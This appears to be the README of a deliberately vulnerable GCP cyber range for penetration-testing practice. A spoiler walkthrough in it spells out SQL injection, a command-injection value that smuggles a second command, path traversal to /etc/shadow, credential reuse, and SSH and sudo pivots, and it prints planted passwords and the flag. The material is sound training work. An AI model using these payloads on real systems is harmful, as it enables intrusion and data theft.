# SmallCo Cyber Range

A disposable, Infrastructure-as-Code cyber range deployed on Google Cloud Platform. Spin up a realistic small-business network in minutes, practice penetration testing against intentional vulnerabilities, then tear it all down to zero cost when you're done.

Built with Terraform and Ansible. Designed for human operators today, with a roadmap toward Gymnasium-compatible RL agent training.

> **Warning**: This range contains deliberately vulnerable software. Never deploy these configurations on production infrastructure or public-facing networks.

---

## Table of Contents

- [Architecture](#architecture)
- [Network Map](#network-map)
- [Prerequisites](#prerequisites)
- [Setup](#setup)
- [Deploying the Range](#deploying-the-range)
- [Connecting to the Range](#connecting-to-the-range)
- [The Scenario](#the-scenario)
- [Vulnerabilities Reference](#vulnerabilities-reference)
- [The Vulnerable Web Application](#the-vulnerable-web-application)
- [Walkthrough (Spoilers)](#walkthrough-spoilers)
- [Cost Management](#cost-management)
- [Configuration Reference](#configuration-reference)
- [Tearing Down](#tearing-down)
- [Troubleshooting](#troubleshooting)
- [Project Structure](#project-structure)
- [Roadmap](#roadmap)
- [Contributing](#contributing)

---

## Architecture

The range simulates **SmallCo**, a small company with a web portal, internal workstations, a database, a file server, and an admin server. The network is split across three subnets with firewall rules that model common segmentation mistakes found in real small-business environments.

All infrastructure runs on GCP Compute Engine using spot (preemptible) instances by default. Terraform provisions the networking and VMs; Ansible configures each host with its services, users, credentials, and intentional vulnerabilities.

```
                        ┌──────────────┐
                        │   Internet   │
                        └──────┬───────┘
                               │
                          SSH (port 22)
                               │
┌──────────────────────────────┼──────────────────────────────────┐
│                              ▼                                  │
│   DMZ Subnet ── 10.0.1.0/24                                    │
│                                                                 │
│   ┌─────────────────┐       ┌─────────────────┐                │
│   │  attacker        │       │  web-server      │                │
│   │  10.0.1.10       │       │  10.0.1.20       │                │
│   │  e2-small        │       │  e2-small        │                │
│   │                  │       │                  │                │
│   │  Your jump box.  │       │  SmallCo Portal  │                │
│   │  Pentest tools   │       │  (Flask app on   │                │
│   │  pre-installed.  │       │   Nginx/8080)    │                │
│   └─────────────────┘       └─────────────────┘                │
│                                                                 │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                    Firewall: SSH, MySQL, SMB, HTTP
                               │
┌──────────────────────────────▼──────────────────────────────────┐
│                                                                 │
│   Internal Subnet ── 10.0.2.0/24                                │
│                                                                 │
│   ┌─────────────────┐       ┌─────────────────┐                │
│   │  workstation-1   │       │  workstation-2   │                │
│   │  10.0.2.10       │       │  10.0.2.11       │                │
│   │  e2-micro        │       │  e2-micro        │                │
│   │                  │       │                  │                │
│   │  User: jsmith    │       │  User: jdoe      │                │
│   │  (IT dept)       │       │  (Finance dept)  │                │
│   └─────────────────┘       └─────────────────┘                │
│                                                                 │
│   ┌─────────────────┐       ┌─────────────────┐                │
│   │  db-server       │       │  file-server     │                │
│   │  10.0.2.20       │       │  10.0.2.30       │                │
│   │  e2-small        │       │  e2-micro        │                │
│   │                  │       │                  │                │
│   │  MySQL 8.0       │       │  NFS + SMB       │                │
│   │  Customer data   │       │  SSH keys to     │                │
│   │  Credential DB   │       │  admin subnet    │                │
│   └─────────────────┘       └─────────────────┘                │
│                                                                 │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                      Firewall: SSH, HTTP
                               │
┌──────────────────────────────▼──────────────────────────────────┐
│                                                                 │
│   Admin Subnet ── 10.0.3.0/24                                   │
│                                                                 │
│   ┌─────────────────────────────────────┐                       │
│   │  admin-server                        │                       │
│   │  10.0.3.10  ·  e2-small             │                       │
│   │                                      │                       │
│   │  Management console                  │                       │
│   │  Flag location: /root/flag.txt       │                       │
│   └─────────────────────────────────────┘                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Network Map

| Host | IP | Subnet | Machine Type | Role |
|------|-----|--------|-------------|------|
| attacker | 10.0.1.10 | DMZ | e2-small | Your jump box (has public IP) |
| web-server | 10.0.1.20 | DMZ | e2-small | Internet-facing web portal |
| workstation-1 | 10.0.2.10 | Internal | e2-micro | IT user (jsmith) workstation |
| workstation-2 | 10.0.2.11 | Internal | e2-micro | Finance user (jdoe) workstation |
| db-server | 10.0.2.20 | Internal | e2-small | MySQL database |
| file-server | 10.0.2.30 | Internal | e2-micro | NFS/SMB file shares, backup scripts |
| admin-server | 10.0.3.10 | Admin | e2-small | Management server (final target) |

---

## Prerequisites

You'll need the following installed on your local machine:

| Tool | Version | Install |
|------|---------|---------|
| Terraform | >= 1.5 | [hashicorp.com/terraform/install](https://developer.hashicorp.com/terraform/install) |
| Ansible | >= 2.14 | [docs.ansible.com](https://docs.ansible.com/ansible/latest/installation_guide/) |
| Google Cloud SDK | latest | [cloud.google.com/sdk](https://cloud.google.com/sdk/docs/install) |

You also need:

- A **GCP project** with the **Compute Engine API** enabled
- An **SSH keypair** (default: `~/.ssh/id_rsa` and `~/.ssh/id_rsa.pub`)
- **Billing enabled** on your GCP project (spot VMs cost ~$0.50-1.00/hr total for the full range)

### Enable the Compute Engine API

```bash
gcloud services enable compute.googleapis.com --project=YOUR_PROJECT_ID
```

### Generate an SSH key (if you don't have one)

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

---

## Setup

### 1. Authenticate with GCP

```bash
gcloud auth login
gcloud auth application-default login
```

### 2. Create your Terraform variables file

```bash
cp terraform/terraform.tfvars.example terraform/terraform.tfvars
```

Edit `terraform/terraform.tfvars` with your values:

```hcl
project_id       = "my-gcp-project-123"    # REQUIRED: your GCP project ID
region           = "us-central1"            # GCP region (change for lower latency)
zone             = "us-central1-a"          # GCP zone
ssh_pub_key_file = "~/.ssh/id_rsa.pub"      # Path to your SSH public key
ssh_user         = "ranger"                 # SSH username created on all VMs
use_spot         = true                     # Use spot VMs (cheaper, may be preempted)
```

> **Tip**: Choose a region close to you for lower SSH latency. The default `us-central1` works well for most US-based users.

---

## Deploying the Range

A single script handles the full deployment: Terraform provisioning, inventory generation, and Ansible configuration.

```bash
./scripts/deploy.sh
```

This runs three phases:

1. **Terraform** (`~2 min`): Creates the VPC, three subnets, firewall rules, Cloud NAT, and 8 VM instances
2. **Inventory generation**: Exports Terraform outputs into an Ansible inventory file
3. **Ansible** (`~3 min`): Configures each host with its services, users, vulnerabilities, and planted artifacts

When deployment finishes you'll see:

```
============================================
  SmallCo Cyber Range - DEPLOYED
============================================

  Attacker SSH:  ssh ranger@<PUBLIC_IP>
  Web Portal:    http://10.0.1.20 (from attacker)
  Range Info:    ~/RANGE_INFO.md (on attacker)

  To tear down:  ./scripts/destroy.sh
============================================
```

---

## Connecting to the Range

### SSH to the attacker box

The attacker VM is the only host with a public IP. It serves as your jump box into the range.

```bash
# Using the convenience script:
./scripts/ssh-attacker.sh

# Or directly:
ssh ranger@<ATTACKER_PUBLIC_IP>
```

### Orientation on the attacker box

Once connected, you'll find two files in your home directory:

| File | Purpose |
|------|---------|
| `~/RANGE_INFO.md` | Attack brief with objective, scope, rules of engagement, and hints |
| `~/attack_log.md` | Template to document your attack path |

### Pre-installed tools on the attacker

The attacker box comes with common penetration testing tools:

- **Reconnaissance**: nmap, nikto, dirb, gobuster, dnsutils, whois
- **Exploitation**: sqlmap, hydra, john, hashcat, metasploit (impacket)
- **Network**: netcat, tcpdump, smbclient, enum4linux, mysql-client, nfs-common, sshpass
- **Scripting**: Python 3, pip, requests, beautifulsoup4, pwntools, impacket

---

## The Scenario

You are an external attacker who has gained network access to SmallCo's DMZ. Your mission:

> **Objective**: Compromise the admin-server (10.0.3.10) and retrieve the flag from `/root/flag.txt`

### Rules of engagement

- All hosts within 10.0.1.0/24, 10.0.2.0/24, and 10.0.3.0/24 are in scope
- No denial-of-service attacks
- Document your attack path in `~/attack_log.md`

### Starting point

You have direct network access to the DMZ subnet (10.0.1.0/24). Start with reconnaissance.

### What you're looking for

The range models a common real-world pattern: a chain of small misconfigurations and poor practices that, when linked together, allow an attacker to pivot from an internet-facing web app all the way to root access on a restricted management server. The intended path involves:

- Input validation flaws in web applications
- Credential reuse across systems
- Sensitive information in configuration files and shell histories
- Overly permissive SSH key trust relationships
- Misconfigured sudo rules

---

## Vulnerabilities Reference

Each host has specific, intentional vulnerabilities that form the attack chain.

| Host | Vulnerability | Category | Severity |
|------|--------------|----------|----------|
| web-server | SQL injection in login form | OWASP A03:2021 Injection | Critical |
| web-server | SQL injection in employee search | OWASP A03:2021 Injection | Critical |
| web-server | OS command injection in diagnostics page | OWASP A03:2021 Injection | Critical |
| web-server | Path traversal in file viewer | OWASP A01:2021 Broken Access Control | High |
| web-server | Hardcoded database credentials in `/opt/backups/config.ini` | OWASP A07:2021 Security Misconfiguration | High |
| workstation-1 | Credentials exposed in `.bash_history` | CWE-256 Plaintext Storage of Password | Medium |
| workstation-2 | Plaintext passwords in user's notes file | CWE-256 Plaintext Storage of Password | Medium |
| db-server | Sensitive data (SSNs, credit cards) stored unencrypted | OWASP A02:2021 Cryptographic Failures | High |
| db-server | Credential table with passwords to other systems | OWASP A07:2021 Security Misconfiguration | Critical |
| db-server | MySQL accessible from DMZ with weak credentials | OWASP A07:2021 Security Misconfiguration | High |
| file-server | Hardcoded credentials in backup shell scripts | OWASP A07:2021 Security Misconfiguration | High |
| file-server | IT documentation exposes admin-server credentials | CWE-256 Plaintext Storage of Password | High |
| file-server | SSH private key grants access to admin subnet | CWE-321 Use of Hard-coded Cryptographic Key | Critical |
| admin-server | `svc_backup` has passwordless sudo (ALL commands) | CWE-269 Improper Privilege Management | Critical |

---

## The Vulnerable Web Application

The web-server hosts the **SmallCo Internal Portal**, a Flask application with four exploitable features:

### Pages

| Route | Feature | Vulnerability |
|-------|---------|--------------|
| `/login` | User authentication | SQL injection via unsanitized string formatting in query |
| `/employees` | Employee directory with search | SQL injection in search parameter |
| `/diagnostics` | Network ping tool | OS command injection via `subprocess.run(..., shell=True)` |
| `/files` | Shared file viewer | Path traversal (no sanitization of `../` sequences) |

### Accessing the portal

From the attacker box:

```bash
# Via browser (if you have X forwarding or a SOCKS proxy):
curl http://10.0.1.20

# Quick test for SQL injection:
curl -X POST http://10.0.1.20:8080/login \
  -d "username=' OR 1=1--&password=anything"

# Test command injection:
curl -X POST http://10.0.1.20:8080/diagnostics \
  -d "host=10.0.2.10; id"

# Test path traversal:
curl "http://10.0.1.20:8080/files?f=../../../etc/passwd"
```

### Default portal users

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| jsmith | password1 | user |
| svc_backup | Backup2026! | service |

---

## Walkthrough (Spoilers)

<details>
<summary>Click to reveal the full attack walkthrough</summary>

### Phase 1: Reconnaissance

```bash
# Scan the DMZ
nmap -sV -sC 10.0.1.0/24

# Discover the web portal on port 80/8080
curl http://10.0.1.20
```

### Phase 2: Initial Access — Web Application Exploitation

**Option A: SQL Injection**

```bash
# Bypass login with SQL injection
# Username: ' OR 1=1--
# Password: anything

# Or use sqlmap for automated extraction
sqlmap -u "http://10.0.1.20:8080/employees?q=test" --dump
```

This dumps the employee directory, which contains notes revealing:
- `svc_backup` account details and credential locations
- Network topology hints (file-server at 10.0.2.30, admin-server at 10.0.3.10)
- The path `/opt/backups/config.ini` on the web server

**Option B: Command Injection**

```bash
# Use the diagnostics page to execute arbitrary commands
# In the "host" field: 10.0.2.10; cat /opt/backups/config.ini

curl -X POST http://10.0.1.20:8080/diagnostics \
  -d "host=10.0.2.10; cat /opt/backups/config.ini"
```

This reveals:
```ini
[database]
host = 10.0.2.20
user = svc_backup
password = Backup2026!

[file-server]
host = 10.0.2.30
user = svc_backup
```

**Option C: Path Traversal**

```bash
# Read arbitrary files from the web server
curl "http://10.0.1.20:8080/files?f=../../../../opt/backups/config.ini"
curl "http://10.0.1.20:8080/files?f=../../../../etc/shadow"
```

### Phase 3: Pivot to Internal Network

```bash
# Connect to MySQL on db-server using discovered credentials
mysql -h 10.0.2.20 -u svc_backup -p'Backup2026!' smallco_db

# Dump the credentials table
SELECT * FROM credentials;
```

The credentials table reveals:
- `admin-server-ssh`: admin / `Adm1nS3rv3r!`
- `file-server-smb`: svc_backup / `Backup2026!`

```bash
# SSH to workstation-1 as jsmith (uses 'password1' everywhere)
sshpass -p 'password1' ssh jsmith@10.0.2.10

# Check bash history for more intel
cat ~/.bash_history
```

### Phase 4: Lateral Movement to File Server

```bash
# SSH to file-server as svc_backup
sshpass -p 'Backup2026!' ssh svc_backup@10.0.2.30

# Browse the shared files
cat /srv/shared/it/admin_access.txt
cat /srv/shared/backups/db_backup.sh

# Find the SSH key that reaches admin-server
ls -la ~/.ssh/
```

The file `/srv/shared/it/admin_access.txt` confirms:
- svc_backup has an SSH key to admin-server
- svc_backup has sudo on admin-server

### Phase 5: Admin Server Compromise

```bash
# Use svc_backup's SSH key to reach admin-server
ssh -i /home/svc_backup/.ssh/id_rsa svc_backup@10.0.3.10

# svc_backup has NOPASSWD sudo
sudo cat /root/flag.txt
```

### Flag

```
╔══════════════════════════════════════════════╗
║                                              ║
║   FLAG{smallco_range_pwned_2026}             ║
║                                              ║
╚══════════════════════════════════════════════╝
```

</details>

---

## Cost Management

The range is designed for **ephemeral use** — deploy when you need it, destroy when you're done.

| Scenario | Estimated Cost |
|----------|---------------|
| Full range running (8 spot VMs) | ~$0.50–1.00 / hour |
| A 4-hour practice session | ~$4 |
| 10 sessions per month | ~$40 |
| At rest (all resources destroyed) | **$0.00** |

### Tips for keeping costs low

- **Always destroy after use**: Run `./scripts/destroy.sh` when you finish. There is zero persistent state worth keeping.
- **Use spot VMs** (default): Set `use_spot = true` in `terraform.tfvars`. Spot instances are 60-91% cheaper than on-demand. The tradeoff is that GCP can reclaim them, but for short practice sessions this is rarely an issue.
- **Choose a cheap region**: Spot pricing varies by region. `us-central1` tends to be among the cheapest.
- **Check for orphaned resources**: If a deploy fails partway through, run `terraform destroy` to clean up.

### Switching to non-preemptible VMs

If you need guaranteed uptime (e.g., for a multi-day exercise), set:

```hcl
use_spot = false
```

This increases cost to approximately $2-3/hour for the full range.

---

## Configuration Reference

All configuration lives in `terraform/terraform.tfvars`:

| Variable | Type | Default | Description |
|----------|------|---------|-------------|
| `project_id` | string | **(required)** | Your GCP project ID |
| `region` | string | `us-central1` | GCP region for all resources |
| `zone` | string | `us-central1-a` | GCP zone for VM placement |
| `ssh_pub_key_file` | string | `~/.ssh/id_rsa.pub` | Path to your SSH public key |
| `ssh_user` | string | `ranger` | Username created on all VMs for SSH access |
| `use_spot` | bool | `true` | Use spot/preemptible instances to reduce cost |

### Firewall rules summary

| Rule | Source | Destination | Ports | Purpose |
|------|--------|-------------|-------|---------|
| allow-ssh-attacker | 0.0.0.0/0 | attacker | 22 | SSH into jump box |
| allow-web-dmz | 0.0.0.0/0 | web-server | 80, 443, 8080 | Public web portal |
| attacker-to-dmz | attacker | DMZ hosts | all TCP/UDP/ICMP | Attacker recon |
| dmz-to-internal | DMZ hosts | internal hosts | 22, 3306, 445, 139, 80, 8080 | Pivot path |
| internal-to-internal | internal hosts | internal hosts | all TCP/UDP/ICMP | Lateral movement |
| internal-to-admin | internal hosts | admin hosts | 22, 80, 443 | Final pivot |
| allow-icmp-internal | 10.0.0.0/8 | all | ICMP | Network discovery |

---

## Tearing Down

```bash
./scripts/destroy.sh
```

This runs `terraform destroy` and removes all GCP resources (VMs, VPC, subnets, firewall rules, NAT). You'll be prompted to confirm. After destruction, your monthly cost is **$0.00**.

The generated Ansible inventory (`ansible/inventory/hosts.ini`) is gitignored and can be safely deleted, but it will be regenerated on the next deploy anyway.

---

## Troubleshooting

### Terraform apply fails with permission errors

Make sure you've authenticated and set the project:

```bash
gcloud auth application-default login
gcloud config set project YOUR_PROJECT_ID
```

Ensure the Compute Engine API is enabled:

```bash
gcloud services enable compute.googleapis.com
```

### Ansible can't reach the VMs

- The deploy script waits 30 seconds for VMs to boot. If Ansible still fails, wait a minute and re-run just Ansible:
  ```bash
  cd ansible && ansible-playbook playbooks/site.yml -v
  ```
- Verify the attacker has a public IP: `terraform -chdir=terraform output attacker_public_ip`
- All internal hosts are reached via SSH ProxyJump through the attacker. Ensure your SSH private key matches the public key in `terraform.tfvars`.

### Spot VMs got preempted mid-session

GCP can reclaim spot instances at any time. If a VM disappears:

```bash
# Redeploy just the terminated VM
cd terraform && terraform apply -auto-approve

# Re-run Ansible to reconfigure it
cd ../ansible && ansible-playbook playbooks/site.yml -v
```

Or simply redeploy the entire range — it only takes ~5 minutes.

### Web portal isn't responding

SSH to the web server through the attacker and check the service:

```bash
ssh -J ranger@<ATTACKER_IP> ranger@10.0.1.20
sudo systemctl status smallco-portal
sudo systemctl status nginx
sudo journalctl -u smallco-portal -n 50
```

### MySQL connection refused from DMZ

Verify MySQL is listening on all interfaces:

```bash
ssh -J ranger@<ATTACKER_IP> ranger@10.0.2.20
sudo ss -tlnp | grep 3306
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep bind-address
```

---

## Project Structure

```
cyber-range/
│
├── terraform/                      # Infrastructure provisioning
│   ├── main.tf                     #   Terraform + Google provider config
│   ├── variables.tf                #   Input variable definitions
│   ├── network.tf                  #   VPC, 3 subnets, Cloud Router, NAT
│   ├── firewall.tf                 #   Inter-subnet firewall rules
│   ├── instances.tf                #   8 VM instance definitions
│   ├── outputs.tf                  #   IP outputs + Ansible inventory generation
│   ├── inventory.tftpl             #   Ansible inventory template
│   └── terraform.tfvars.example    #   Example variables (copy to terraform.tfvars)
│
├── ansible/                        # Host configuration
│   ├── ansible.cfg                 #   Ansible settings (inventory path, sudo, etc.)
│   ├── inventory/                  #   Generated inventory (gitignored)
│   │   └── hosts.ini               #     Auto-generated from Terraform outputs
│   └── playbooks/
│       ├── site.yml                #   Master playbook (imports all others)
│       ├── web-server.yml          #   Flask app, nginx, planted credentials
│       ├── workstations.yml        #   User accounts, bash history, notes
│       ├── db-server.yml           #   MySQL, seed data, credential tables
│       ├── file-server.yml         #   NFS, SSH keys, backup scripts
│       ├── admin-server.yml        #   Flag file, sudo misconfig, admin accounts
│       └── attacker.yml            #   Pentest tools, range briefing docs
│
├── apps/
│   └── vulnerable-web/             # Intentionally vulnerable web application
│       ├── app.py                  #   Flask app (SQLi, RCE, path traversal)
│       ├── requirements.txt        #   Python dependencies
│       └── files/                  #   Shared files served by the portal
│           ├── welcome.txt
│           ├── network_map.txt     #   Network topology (recon intel)
│           └── it_contacts.txt     #   IT department contacts
│
├── scripts/                        # Operational scripts
│   ├── deploy.sh                   #   Full deploy: Terraform → inventory → Ansible
│   ├── destroy.sh                  #   Full teardown: Terraform destroy
│   └── ssh-attacker.sh             #   Quick-connect to attacker jump box
│
├── .gitignore
└── README.md
```

---

## Roadmap

- [x] **M1**: Terraform + Ansible IaC deployment on GCP
- [x] **M2**: Configured vulnerabilities, planted credentials, and attack path with flag
- [ ] **M3**: Synthetic background traffic generation (simulated user activity on workstations)
- [ ] **M4**: Gymnasium API wrapper for reinforcement learning agent training

---

## Contributing

This project is in early development. If you want to extend it:

- **Add a vulnerability**: Create or modify an Ansible playbook in `ansible/playbooks/` and update the vulnerability table above.
- **Add a host**: Define a new `google_compute_instance` in `terraform/instances.tf`, add it to the inventory template in `terraform/inventory.tftpl`, and create a corresponding Ansible playbook.
- **Change the network**: Modify subnets in `terraform/network.tf` and firewall rules in `terraform/firewall.tf`.

All changes should be testable with a fresh `./scripts/deploy.sh` cycle.
